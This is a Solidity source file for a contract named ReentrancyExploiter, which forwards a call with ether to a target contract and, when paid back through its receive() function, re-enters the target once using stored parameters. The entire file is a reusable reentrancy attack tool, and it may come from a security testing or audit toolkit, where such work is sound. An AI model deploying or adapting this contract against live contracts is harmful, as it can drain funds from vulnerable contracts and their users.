// SPDX-License-Identifier: GPL-3.0-only

pragma solidity ^0.8.18;

contract ReentrancyExploiter {

  // re-entrancy attack params
  address public target;
  uint public value;
  bytes public data;

  bool public hasReentered = false;

  /**
   * @notice Sets the reentrancy attack params
   * @dev Call this separately if re-entracy attack entry point is different from the initial call
   */
  function setReentrancyParams(address _target, uint _value, bytes memory _data) public {
    target = _target;
    value = _value;
    data = _data;
  }

  /**
   * @notice Executes the reentrancy exploit
   */
  function execute(address _target, uint _value, bytes memory _data) public {

    // if re-entrancy attack params are not set, use the same params as the initial call
    if (address(target) == address(0) && value == 0 && data.length == 0) {
      setReentrancyParams(_target, _value, _data);
    }

    (bool ok, bytes memory returndata) = _target.call{value: _value}(_data);

    if (!ok) {
      // pass revert reason and bubble it up if present
      if (returndata.length > 0) {
        assembly ("memory-safe") {
          let returndata_size := mload(returndata)
          revert(add(32, returndata), returndata_size)
        }
      }

      revert("Low-level call failed");
    }
  }

  receive() external payable {
    if (!hasReentered) {
      hasReentered = true;
      execute(target, value, data);
      hasReentered = false;
    }
  }
}
